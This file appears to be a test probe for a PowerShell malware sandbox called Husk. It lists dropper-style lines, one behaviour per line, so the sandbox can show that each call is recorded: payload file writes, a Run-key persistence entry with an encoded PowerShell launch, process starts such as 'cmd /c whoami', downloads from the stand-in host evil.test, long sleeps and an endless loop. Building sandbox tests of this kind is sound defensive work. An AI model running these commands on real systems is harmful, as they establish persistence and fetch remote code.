# Husk capture probe: one line per host-reaching call a dropper makes.
#
# SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
# Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)
#
# Each line is run on its own and its records printed, so a layer that stops
# seeing something shows up as a missing CALL rather than as a wrong number.
# Blank lines and comments are skipped.

# Filesystem, from .NET and from the cmdlets. The .NET route goes through the
# binder; the cmdlet route only through the cmdlet layer.
[IO.File]::WriteAllText("C:\Users\Public\a.ps1", "payload")
Out-File -FilePath "C:\Users\Public\b.txt" -InputObject "x"
Set-Content -Path "C:\Users\Public\c.txt" -Value "y"
New-Item -Path "C:\Users\Public\d.txt" -ItemType File -Value "z" | Out-Null
Get-ChildItem C:\Users\Public | ForEach-Object { $_.Name } | Out-String
Remove-Item "C:\Users\Public\b.txt"
"C:\Users\Public\e.txt","C:\Users\Public\f.txt" | ForEach-Object { Set-Content -Path $_ -Value "pipeline" }

# Registry, through the virtual provider. The Run key is the persistence IOC.
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "powershell -enc AAA" | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "C:\Users\Public\a.ps1"
(Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater).Updater
New-Item -Path "HKCU:\Software\Husk\Nested" -Force | Out-Null
Get-ChildItem "HKCU:\Software" | ForEach-Object { $_.Name } | Out-String
(Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion").ProductName
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater
Remove-Item "HKCU:\Software\Husk" -Recurse
[Microsoft.Win32.Registry]::SetValue("HKEY_CURRENT_USER\Software\X","v","1")

# Process. Both routes are recorded and then refused, so the sample keeps
# running: Process is unsupported in a browser and would otherwise abort it.
Start-Process "calc.exe"; "after Start-Process still runs"
[Diagnostics.Process]::Start("cmd.exe","/c whoami")

# Network. Blocked and recorded; nothing reaches a real server.
(New-Object Net.WebClient).DownloadString("http://evil.test/a")
Invoke-WebRequest "http://evil.test/b"

# Timing. A sleep is the one hole the step budget cannot cover, because it
# happens inside a statement; both routes are capped at SleepCapMilliseconds.
$t = Get-Date; Start-Sleep -Seconds 600; "Start-Sleep 600s took $([int]((Get-Date)-$t).TotalMilliseconds) ms"
$t = Get-Date; [Threading.Thread]::Sleep(600000); "Thread.Sleep 600s took $([int]((Get-Date)-$t).TotalMilliseconds) ms"

# Budgets. A delay loop is ordinary anti-analysis; this must not hang the tab.
$i = 0; while ($true) { try { $i++ } catch { } }
